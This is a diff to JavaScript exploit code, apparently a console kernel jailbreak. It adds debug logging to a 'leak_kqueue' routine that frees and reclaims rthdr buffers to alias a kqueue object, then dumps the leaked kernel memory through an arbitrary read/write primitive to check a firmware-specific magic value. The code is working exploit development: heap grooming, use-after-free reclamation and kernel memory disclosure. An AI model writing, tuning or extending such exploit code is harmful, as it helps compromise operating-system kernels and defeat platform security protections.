@@ -579,6 +579,10 @@ async function ucred_triple_free() {
 function leak_kqueue() {
   logger.info("Leak kqueue started...");
 
+  // TEMP DEBUG (jailstation): confirm the read chain itself is alive and
+  // dump fd numbers involved in the grooming, before we free anything.
+  logger.debug(`[debug] triplets: ${triplets[0]},${triplets[1]},${triplets[2]}`);
+
   // Free one
   free_rthdr(triplets[2]);
 
@@ -592,15 +596,24 @@ function leak_kqueue() {
 
     get_rthdr(triplets[0], KQUEUE_SIZE);
 
+    // TEMP DEBUG (jailstation): dump every qword in the leaked buffer (not
+    // just offset 8) so we can tell "aliasing never landed" (all zero) apart
+    // from "landed, but 0x1430000 is the wrong offset/value for this FW"
+    // (some qwords nonzero / plausible kernel-VA shaped). Only first few and
+    // last iteration to avoid flooding the sink.
+    if (i < 4 || i === NUM_LEAK_KQUEUE - 1) {
+      let dump = [];
+      for (let off = 0; off < 0x48; off += 8) {
+        dump.push(`+${off.toString(16)}=${arw.view(leak_rthdr0_addr).getBInt(off, true)}`);
+      }
+      logger.debug(`[debug] iter ${i}: kq=${kq} buf: ${dump.join(" ")}`);
+    }
+
     const kq_hdr = arw.view(leak_rthdr0_addr).getBInt(8, true);
     if (kq_hdr.eq(0x1430000)) {
       logger.debug(`Leaked kqueue after ${i} iterations !!`);
       leaked = true;
       break;
-    } else if (i < 8 || i === NUM_LEAK_KQUEUE - 1) {
-      // TEMP DEBUG (jailstation): dump what we actually see at offset 8
-      // so we can tell if 0x1430000 is just wrong for this FW build.
-      logger.debug(`[debug] iter ${i}: kq_hdr = ${kq_hdr}`);
     }
 
     if (fn.close.invoke(kq) === -1) {
